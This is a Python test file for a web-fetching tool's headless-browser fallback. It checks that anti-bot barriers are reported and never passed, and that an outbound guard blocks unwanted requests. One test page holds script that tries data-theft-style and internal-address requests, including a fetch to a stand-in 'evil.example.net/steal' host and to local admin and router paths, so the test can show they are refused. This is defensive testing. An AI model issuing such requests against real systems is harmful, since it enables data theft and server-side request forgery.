"""Tests: browser-like requests, anti-bot barriers reported and never passed, the
headless-browser fallback, and the guard on every request the browser makes. The browser is the
real headless Chromium of vendor/playwright; the network is scripted (a resolver and an httpx
transport), and a local server proves that the browser itself connects to nothing.
"""

import asyncio
import socket
import threading
from pathlib import Path

import httpx
import pytest

from app import web_fetch
from app.security.outbound import Guard
from app.web_fetch import BarrierError, FetchError, Limits, RefusedError, fetch_markdown

REPO = Path(__file__).resolve().parent.parent
BROWSERS = REPO / "vendor" / "playwright"
PUBLIC = "93.184.216.34"
DNS = {"example.org": [PUBLIC], "cdn.example.org": [PUBLIC], "evil.example.net": [PUBLIC],
       "inside.example.org": ["10.0.0.5"]}  # fmt: skip
ARTICLE = "<p>" + "Sea otters hold hands while they sleep. " * 20 + "</p>"


def resolver(host, port):
    if host not in DNS:
        raise OSError("no such host")
    return DNS[host]


def _limits(**extra) -> Limits:
    return Limits(allowed_hosts=frozenset({"example.org"}), cache_seconds=0, **extra)


class Web:
    def __init__(self, pages):
        self.pages, self.requests = pages, []

    def __call__(self, request):
        """A fresh response each time: the browser may ask for the same address twice."""
        self.requests.append(request)
        answer = self.pages.get((request.headers["host"], request.url.path))
        if answer is None:
            return httpx.Response(404)
        if callable(answer):
            return answer()
        return httpx.Response(answer.status_code, headers=answer.headers, content=answer.content)


def html(body, status=200, **headers):
    return httpx.Response(status, text=f"<html><body>{body}</body></html>",
                          headers={"content-type": "text/html", **headers})  # fmt: skip


async def fetch(url, pages, limits):
    web = Web(pages)
    async with httpx.AsyncClient(transport=httpx.MockTransport(web)) as client:
        guard = Guard(allowed_hosts=limits.allowed_hosts, resolver=resolver)
        try:
            return await fetch_markdown(url, limits, guard=guard, client=client), web
        except FetchError as exc:
            return exc, web


@pytest.fixture(autouse=True)
def _no_cache():
    web_fetch.clear_cache()


# --- a browser-like request (item 1) ---


async def test_a_page_is_asked_for_as_a_desktop_browser_asks_and_the_name_is_configurable():
    (_f, _md), web = await fetch("https://example.org/a", {("example.org", "/a"): html(ARTICLE)},
                                 _limits())  # fmt: skip
    sent = web.requests[0].headers
    assert sent["user-agent"].startswith("Mozilla/5.0") and "Chrome/" in sent["user-agent"]
    assert sent["accept"].startswith("text/html") and "en-US" in sent["accept-language"]
    (_f, _md), web = await fetch("https://example.org/a", {("example.org", "/a"): html(ARTICLE)},
                                 _limits(user_agent="MyReader/1.0"))  # fmt: skip
    assert web.requests[0].headers["user-agent"] == "MyReader/1.0"


def test_the_settings_are_read_from_the_environment():
    limits = Limits.from_environment({"WEB_FETCH_USER_AGENT": "X/1", "WEB_FETCH_BROWSER": "true"})
    assert (limits.user_agent, limits.browser) == ("X/1", True)
    assert Limits.from_environment({}).browser is False


# --- barriers (item 3) ---


@pytest.mark.parametrize(
    ("response"),
    [
        lambda: html('<div id="cf-chl-widget">Just a moment...</div>', 403),
        lambda: html("<h1>Checking your browser before accessing</h1>", 503),
        lambda: html('<form><div class="g-recaptcha" data-sitekey="x"></div></form>' + ARTICLE),
        lambda: html("blocked", 403, **{"cf-mitigated": "challenge"}),
        lambda: html('<script src="https://geo.captcha-delivery.com/c.js"></script>', 403),
    ],
)
async def test_an_anti_bot_barrier_is_reported_and_the_browser_never_tries_it(
    response, monkeypatch
):
    rendered = []

    async def never(*a, **k):
        rendered.append(1)
        return "", ""

    monkeypatch.setattr(web_fetch, "_rendered", never)
    result, _ = await fetch("https://example.org/p", {("example.org", "/p"): response},
                            _limits(browser=True))  # fmt: skip
    assert isinstance(result, BarrierError)
    assert str(result) == "this page is protected against automated reading; open it yourself"
    assert rendered == [], "a barrier is never passed through the browser"


async def test_a_refusal_without_a_barrier_is_the_answer_unless_the_browser_may_try(monkeypatch):
    pages = {("example.org", "/p"): html("Forbidden", 403), ("example.org", "/n"): html("x", 404)}
    result, _ = await fetch("https://example.org/p", pages, _limits())
    assert isinstance(result, RefusedError) and str(result) == "the server answered 403"

    async def rendered(url, limits, guard):
        return "rendered " + ARTICLE, url

    monkeypatch.setattr(web_fetch, "_rendered", rendered)
    (_final, markdown), _ = await fetch("https://example.org/p", pages, _limits(browser=True))
    assert markdown.startswith("rendered")
    missing, _ = await fetch("https://example.org/n", pages, _limits(browser=True))
    assert isinstance(missing, RefusedError) and missing.status == 404, "only a 403 is retried"


# --- the fallback (item 2) ---


async def test_a_page_with_almost_no_text_is_rendered_and_the_longer_text_kept(monkeypatch):
    calls = []

    async def rendered(url, limits, guard):
        calls.append(url)
        return "Quotes: " + "a real quote. " * 40, url

    monkeypatch.setattr(web_fetch, "_rendered", rendered)
    pages = {("example.org", "/js"): html("<nav>Login Next</nav>"),
             ("example.org", "/full"): html(ARTICLE)}  # fmt: skip
    (_f, plain), _ = await fetch("https://example.org/js", pages, _limits())
    assert len(plain) < web_fetch.MIN_TEXT_CHARS and calls == []
    (_f, text), _ = await fetch("https://example.org/js", pages, _limits(browser=True))
    assert text.startswith("Quotes:") and calls == ["https://example.org/js"]
    (_f, full), _ = await fetch("https://example.org/full", pages, _limits(browser=True))
    assert "Sea otters" in full and calls == ["https://example.org/js"], "enough text: no browser"


# --- the browser itself ---

needs_browser = pytest.mark.skipif(
    not any(BROWSERS.glob("chromium_headless_shell-*")),
    reason="the headless browser is not installed in vendor/playwright",
)


class _Listener:
    """A local server that counts the connections it receives."""

    def __init__(self):
        self.sock = socket.socket()
        self.sock.bind(("127.0.0.1", 0))
        self.sock.listen(16)
        self.sock.settimeout(0.2)
        self.port, self.connections, self.running = self.sock.getsockname()[1], 0, True
        threading.Thread(target=self._serve, daemon=True).start()

    def _serve(self):
        while self.running:
            try:
                conn, _ = self.sock.accept()
                self.connections += 1
                conn.close()
            except OSError:
                pass

    def close(self):
        self.running = False
        self.sock.close()


@pytest.mark.parametrize("second_barrier", [True, False], ids=["with-proxy", "route-alone"])
@needs_browser
async def test_every_request_of_the_browser_goes_through_the_guard(monkeypatch, second_barrier):
    """Each layer on its own: with the proxy that leads nowhere, and without it (the route
    alone must keep the browser off the network)."""
    from app import web_render
    from app.web_render import render_html

    monkeypatch.setenv("PLAYWRIGHT_BROWSERS_PATH", str(BROWSERS))
    if not second_barrier:
        monkeypatch.setattr(
            web_render, "CHROMIUM_ARGS",
            [a for a in web_render.CHROMIUM_ARGS if not a.startswith("--proxy")],
        )  # fmt: skip
    listener = _Listener()
    local = f"127.0.0.1:{listener.port}"
    page = f"""<html><body><div id="out">loading</div>
<img src="http://{local}/pixel.png"><img src="https://cdn.example.org/pixel.png">
<script src="https://cdn.example.org/app.js"></script>
<script>
  const tries = ["https://127.0.0.1/admin", "https://inside.example.org/router",
                 "https://{local}/tls", "http://example.org/plain",
                 "https://evil.example.net/steal?d=1", "http://{local}/x"];
  Promise.allSettled(tries.map(u => fetch(u))).then(() => {{
    try {{ new WebSocket("ws://{local}/ws"); }} catch (e) {{}}
    document.getElementById("out").textContent = window.fromCdn + " rendered by the script";
  }});
</script></body></html>"""
    pages = {
        ("example.org", "/app"): httpx.Response(200, text=page,
                                                headers={"content-type": "text/html"}),
        ("cdn.example.org", "/app.js"): httpx.Response(
            200, text="window.fromCdn = 'CDN OK';",
            headers={"content-type": "application/javascript"}),
    }  # fmt: skip
    web = Web(pages)
    guard = Guard(allowed_hosts=frozenset({"example.org"}), resolver=resolver)
    try:
        async with httpx.AsyncClient(transport=httpx.MockTransport(web)) as client:
            final, html_out, traffic = await render_html(
                "https://example.org/app", guard, user_agent="Test/1", max_bytes=1 << 20,
                timeout_seconds=30, client=client,
            )  # fmt: skip
        await asyncio.sleep(0.5)
    finally:
        listener.close()
    assert "CDN OK rendered by the script" in html_out
    assert sorted(traffic.fetched) == ["https://cdn.example.org/app.js", "https://example.org/app"]
    refused = {url: reason for url, reason in traffic.refused}
    assert "not allowed" in refused["https://127.0.0.1/admin"]
    assert "non-public address" in refused["https://inside.example.org/router"]
    assert "not allowed" in refused["https://evil.example.net/steal?d=1"]
    assert "not allowed" in refused[f"https://{local}/tls"]
    # http:// from an https page: the browser blocks it itself (mixed content) before the
    # route, or the guard refuses it; either way it is never fetched.
    for url in ("http://example.org/plain", f"http://{local}/x"):
        assert url not in traffic.fetched
        assert url not in refused or "must use https" in refused[url]
    assert traffic.skipped >= 2, "the image and the web socket are skipped"
    assert "https://cdn.example.org/pixel.png" not in traffic.fetched, "images are never fetched"
    assert listener.connections == 0, "the browser itself connected to nothing"
    assert [r.headers["host"] for r in web.requests] == ["example.org", "cdn.example.org"]


@needs_browser
async def test_a_page_over_the_size_limit_stops_the_rendering(monkeypatch):
    from app.web_render import RenderError, render_html

    monkeypatch.setenv("PLAYWRIGHT_BROWSERS_PATH", str(BROWSERS))
    big = httpx.Response(200, text="<p>" + "x" * 50_000 + "</p>",
                         headers={"content-type": "text/html"})  # fmt: skip
    guard = Guard(allowed_hosts=frozenset({"example.org"}), resolver=resolver)
    async with httpx.AsyncClient(
        transport=httpx.MockTransport(Web({("example.org", "/b"): big}))
    ) as c:
        with pytest.raises(RenderError, match="larger than"):
            await render_html("https://example.org/b", guard, user_agent="T", max_bytes=1000,
                              timeout_seconds=30, client=c)  # fmt: skip


def test_the_web_server_gets_the_browser_inside_the_repository(monkeypatch):
    from app.config import get_settings
    from app.mcp.builtin import builtin_environment

    monkeypatch.setenv("WEB_FETCH_BROWSER", "true")
    get_settings.cache_clear()
    try:
        env = builtin_environment("web")
    finally:
        get_settings.cache_clear()
    assert env["WEB_FETCH_BROWSER"] == "true" and env["WEB_FETCH_USER_AGENT"] == ""
    assert Path(env["PLAYWRIGHT_BROWSERS_PATH"]) == BROWSERS


@needs_browser
async def test_the_proxy_alone_keeps_the_browser_off_the_network(monkeypatch):
    """The second barrier on its own: with the route and the web-socket interception switched
    off, every connection of the browser goes to the proxy that leads nowhere."""
    from playwright.async_api import BrowserContext

    from app.web_render import RenderError, render_html

    async def nothing(self, *args, **kwargs):
        return None

    monkeypatch.setattr(BrowserContext, "route", nothing)
    monkeypatch.setattr(BrowserContext, "route_web_socket", nothing)
    monkeypatch.setenv("PLAYWRIGHT_BROWSERS_PATH", str(BROWSERS))
    listener = _Listener()
    local = f"127.0.0.1:{listener.port}"
    guard = Guard(allowed_hosts=frozenset({"*"}), resolver=lambda h, p: [PUBLIC])
    try:
        with pytest.raises(RenderError):
            await render_html(f"https://example.org/?to={local}", guard, user_agent="T",
                              max_bytes=1 << 20, timeout_seconds=10)  # fmt: skip
        for url in (f"https://{local}/", f"http://{local}/"):
            guard_local = Guard(allowed_hosts=frozenset({"*"}), allow_http=True, allow_private=True)
            with pytest.raises(RenderError):
                await render_html(url, guard_local, user_agent="T", max_bytes=1 << 20,
                                  timeout_seconds=10)  # fmt: skip
        await asyncio.sleep(0.5)
    finally:
        listener.close()
    assert listener.connections == 0
